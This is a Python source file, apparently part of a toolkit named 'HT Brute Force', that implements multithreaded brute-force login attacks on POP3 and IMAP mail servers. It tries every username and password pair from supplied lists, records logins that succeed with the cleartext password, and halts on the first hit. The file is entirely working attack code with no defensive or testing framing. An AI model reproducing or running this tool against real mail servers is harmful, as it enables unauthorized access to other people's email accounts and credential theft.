"""HT Brute Force — POP3 and IMAP brute force.
"""
import poplib, imaplib, socket, time, threading, queue

class POP3Bruter:
    def __init__(self, timeout=10, max_threads=5, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _try_login(self, host, port, user, passwd, ssl=False):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            if ssl:
                p = poplib.POP3_SSL(host, port, timeout=self.timeout)
            else:
                p = poplib.POP3(host, port)
            p.user(user)
            p.pass_(passwd)
            p.quit()
            return {"user": user, "password": passwd, "time_s": round(time.time()-t0, 2)}
        except poplib.error_proto:
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}

    def run(self, host, port, users, passwords, ssl=False):
        q = queue.Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                r = self._try_login(host, port, u, p, ssl)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results

class IMAPBruter:
    def __init__(self, timeout=10, max_threads=5, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _try_login(self, host, port, user, passwd, ssl=False):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            if ssl:
                m = imaplib.IMAP4_SSL(host, port, timeout=self.timeout)
            else:
                m = imaplib.IMAP4(host, port)
            m.login(user, passwd)
            m.logout()
            return {"user": user, "password": passwd, "time_s": round(time.time()-t0, 2)}
        except imaplib.IMAP4.error:
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}

    def run(self, host, port, users, passwords, ssl=False):
        q = queue.Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                r = self._try_login(host, port, u, p, ssl)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results